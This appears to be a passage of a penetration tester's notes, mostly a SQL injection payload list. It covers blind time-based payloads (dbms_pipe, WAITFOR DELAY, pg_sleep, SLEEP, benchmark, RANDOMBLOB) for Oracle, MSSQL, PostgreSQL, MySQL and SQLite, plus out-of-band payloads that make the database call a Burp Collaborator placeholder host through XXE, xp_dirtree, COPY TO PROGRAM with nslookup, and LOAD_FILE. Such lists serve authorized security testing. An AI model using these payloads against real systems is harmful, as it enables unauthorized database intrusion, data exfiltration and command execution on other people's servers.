' SELECT dbms_pipe.receive_message(('a'),20)--+-
'; SELECT dbms_pipe.receive_message(('a'),20)--+-
' UNION SELECT dbms_pipe.receive_message(('a'),20)--+-
LIMIT (SELECT dbms_pipe.receive_message(('a'),20))--+-
' WAITFOR DELAY '0:0:20'--+-
'; SELECT WAITFOR DELAY '0:0:20'--+-
' UNION WAITFOR DELAY '0:0:20'--+-
' AND WAITFOR DELAY '0:0:20'--+-
' OR WAITFOR DELAY '0:0:20'--+-
LIMIT SELECT(WAITFOR DELAY '0:0:20')--+-
'SELECT pg_sleep(20)--+-
'||pg_sleep(20)--+-
'; SELECT pg_sleep(10)--+-
'||pg_sleep(10)--+-
';UNION SELECT pg_sleep(10)--+-
LIMIT (SELECT+pg_sleep(20))--+-
'SELECT SLEEP(20)--+-
'||SLEEP(20)--+-
';SELECT SLEEP(20)--+-
'UNION+SELECT SLEEP(20)--+-
LIMIT (SELECT SLEEP(20))--+-
'UNION+SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual'--+-
'SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual--+-
';SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual--+-
LIMIT (SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual)--+-
'IF (1=1) WAITFOR DELAY '0:0:20'--+-
'SELECT IF (1=1) WAITFOR DELAY '0:0:20'--+-
'; SELECT IF (1=1) WAITFOR DELAY '0:0:20'--+-
'UNION SELECT IF (1=1) WAITFOR DELAY '0:0:20'--+-
LIMIT (SELECT IF (1=1) WAITFOR DELAY '0:0:20')--+-
'SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END--+-
';SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END--+-
'UNION SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END--+-
LIMIT (SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END)--+-
'SELECT IF(1=1,SLEEP(20),'a')--+-
'UNION+SELECT IF(1=1,SLEEP(20),'a')--+-
';SELECT IF(1=1,SLEEP(20),'a')--+-
LIMIT (SELECT IF(1=1,SLEEP(20),'a'))--+-
```

Try collaborator:

```
' SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--+-
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--+-
' SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')--+-
' UNION SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')--+-

' exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' UNION exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' UNION SELECT exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' SELECT exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--+-
' UNION SELECT copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--+-
' SELECT copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--+-
'LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--+-
' SELECT LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--+-
' UNION SELECT LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--+-
```

tests si se te va la flapa: [https://github.com/payloadbox/sql-injection-payload-list/tree/master/Intruder/detect](https://github.com/payloadbox/sql-injection-payload-list/tree/master/Intruder/detect)

```
# from wapiti
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 

```